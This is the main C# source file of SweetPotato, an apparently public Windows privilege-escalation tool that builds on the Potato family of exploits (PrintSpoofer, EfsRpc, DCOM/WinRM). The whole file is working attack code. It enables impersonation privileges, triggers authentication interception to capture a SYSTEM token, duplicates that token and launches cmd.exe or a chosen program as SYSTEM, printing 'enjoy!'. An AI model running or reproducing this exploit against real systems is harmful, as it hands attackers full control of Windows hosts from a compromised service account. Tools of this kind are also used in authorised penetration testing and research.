b'\xef\xbb\xbfusing Microsoft.Win32;\r\nusing Mono.Options;\r\nusing System;\r\nusing System.Runtime.InteropServices;\r\nusing System.Security.Principal;\r\nusing System.Threading;\r\nusing static SweetPotato.ImpersonationToken;\r\n\r\nnamespace SweetPotato {\r\n    class Program {\r\n\r\n        static void PrintHelp(OptionSet options) {                \r\n            options.WriteOptionDescriptions(Console.Out);\r\n        }\r\n\r\n        static void Main(string[] args) {\r\n\r\n            string clsId = "4991D34B-80A1-4291-83B6-3328366B9097";\r\n            ushort port = 6666;\r\n            string program = @"c:\\Windows\\System32\\cmd.exe";\r\n            string programArgs = null;\r\n            ExecutionMethod executionMethod = ExecutionMethod.Auto;\r\n            PotatoAPI.Mode mode = PotatoAPI.Mode.PrintSpoofer;\r\n            bool showHelp = false;\r\n            bool isBITSRequired = false;\r\n\r\n            Console.WriteLine(\r\n                "SweetPotato by @_EthicalChaos_\\n" +\r\n                 "  Orignal RottenPotato code and exploit by @foxglovesec\\n" +\r\n                 "  Weaponized JuciyPotato by @decoder_it and @Guitro along with BITS WinRM discovery\\n" + \r\n                 "  PrintSpoofer discovery and original exploit by @itm4n\\n" +\r\n                 "  EfsRpc built on EfsPotato by @zcgonvh and PetitPotam by @topotam"\r\n                );\r\n\r\n            OptionSet option_set = new OptionSet()\r\n                .Add<string>("c=|clsid=", "CLSID (default BITS:\\n4991D34B-80A1-4291-83B6-3328366B9097)", v => clsId = v)\r\n                .Add<ExecutionMethod>("m=|method=", "Auto,User,Thread (default Auto)", v => executionMethod = v)\r\n                .Add("p=|prog=", "Program to launch (default cmd.exe)", v => program = v)\r\n                .Add("a=|args=", "Arguments for program (default null)", v => programArgs = v)\r\n                .Add<PotatoAPI.Mode>("e=|exploit=", "Exploit mode\\n[DCOM|WinRM|EfsRpc|PrintSpoofer(default)] ", v => mode = v)\r\n                .Add<ushort>("l=|listenPort=", "COM server listen port (default 6666)", v => port = v)\r\n                .Add("h|help", "Display this help", v => showHelp = v != null);\r\n\r\n\r\n            try {\r\n\r\n                option_set.Parse(args);\r\n\r\n                if (showHelp) {\r\n                    PrintHelp(option_set);\r\n                    return;\r\n                }\r\n\r\n            } catch (Exception e) {\r\n                Console.WriteLine("[!] Failed to parse arguments: {0}", e.Message);\r\n                PrintHelp(option_set);\r\n                return;\r\n            }\r\n\r\n            try {\r\n\r\n                bool hasImpersonate = EnablePrivilege(SecurityEntity.SE_IMPERSONATE_NAME);\r\n                bool hasPrimary = EnablePrivilege(SecurityEntity.SE_ASSIGNPRIMARYTOKEN_NAME);\r\n                bool hasIncreaseQuota = EnablePrivilege(SecurityEntity.SE_INCREASE_QUOTA_NAME);\r\n\r\n                if(!hasImpersonate && !hasPrimary) {\r\n                    Console.WriteLine("[!] Cannot perform interception, necessary privileges missing.  Are you running under a Service account?");\r\n                    return;\r\n                }\r\n\r\n                if (executionMethod == ExecutionMethod.Auto) {\r\n                    if (hasImpersonate) {\r\n                        executionMethod = ExecutionMethod.Token;\r\n                    } else if (hasPrimary) {\r\n                        executionMethod = ExecutionMethod.User;\r\n                    }\r\n                }\r\n\r\n                if (mode == PotatoAPI.Mode.PrintSpoofer) {\r\n                    Console.WriteLine($"[+] Attempting NP impersonation using method PrintSpoofer to launch {program}");\r\n                } else if (mode == PotatoAPI.Mode.EfsRpc) {\r\n                    Console.WriteLine($"[+] Attempting NP impersonation using method EfsRpc to launch {program}");\r\n                } else {\r\n                    Console.WriteLine("[+] Attempting {0} with CLID {1} on port {2} using method {3} to launch {4}",\r\n                    isBITSRequired ? "NTLM Auth" : "DCOM NTLM interception", clsId, isBITSRequired ? 5985 : port, executionMethod, program);\r\n                }\r\n\r\n                PotatoAPI potatoAPI = new PotatoAPI(new Guid(clsId), port, mode);\r\n\r\n                if (!potatoAPI.Trigger()) {\r\n                    Console.WriteLine("[!] No authenticated interception took place, exploit failed");\r\n                    return;\r\n                }\r\n\r\n                Console.WriteLine("[+] Intercepted and authenticated successfully, launching program");\r\n\r\n                IntPtr impersonatedPrimary;\r\n\r\n                if (!DuplicateTokenEx(potatoAPI.Token, TOKEN_ALL_ACCESS, IntPtr.Zero,\r\n                    SECURITY_IMPERSONATION_LEVEL.SecurityIdentification, TOKEN_TYPE.TokenPrimary, out impersonatedPrimary)) {\r\n                    Console.WriteLine("[!] Failed to impersonate security context token");\r\n                    return;\r\n                }\r\n\r\n                Thread systemThread = new Thread(() => {\r\n                    SetThreadToken(IntPtr.Zero, potatoAPI.Token);\r\n                    STARTUPINFO si = new STARTUPINFO();\r\n                    PROCESS_INFORMATION pi = new PROCESS_INFORMATION();\r\n                    si.cb = Marshal.SizeOf(si);\r\n                    si.lpDesktop = @"WinSta0\\Default";\r\n\r\n                    //Console.WriteLine("[+] Created launch thread using impersonated user {0}", WindowsIdentity.GetCurrent(true).Name);\r\n\r\n                    string finalArgs = null;\r\n\r\n                    if(programArgs != null)\r\n                        finalArgs = string.Format("\\"{0}\\" {1}", program, programArgs);\r\n\r\n                    if (executionMethod == ExecutionMethod.Token) {\r\n                        if (!CreateProcessWithTokenW(potatoAPI.Token, 0, program, finalArgs, CreationFlags.NewConsole, IntPtr.Zero, null, ref si, out pi)) {\r\n                            Console.WriteLine("[!] Failed to created impersonated process with token: {0}", Marshal.GetLastWin32Error());\r\n                            return;\r\n                        }\r\n                    } else {\r\n                        if (!CreateProcessAsUserW(impersonatedPrimary, program, finalArgs, IntPtr.Zero,\r\n                            IntPtr.Zero, false, CREATE_NEW_CONSOLE, IntPtr.Zero, @"C:\\", ref si, out pi)) {\r\n                            Console.WriteLine("[!] Failed to created impersonated process with user: {0} ", Marshal.GetLastWin32Error());\r\n                            return;\r\n                        }\r\n                    }\r\n                    Console.WriteLine("[+] Process created, enjoy!");\r\n                });\r\n\r\n                systemThread.Start();\r\n                systemThread.Join();\r\n\r\n            } catch (Exception e) {\r\n                Console.WriteLine("[!] Failed to exploit COM: {0} ", e.Message);\r\n                Console.WriteLine(e.StackTrace.ToString());\r\n            }\r\n        }\r\n    }\r\n}\r\n'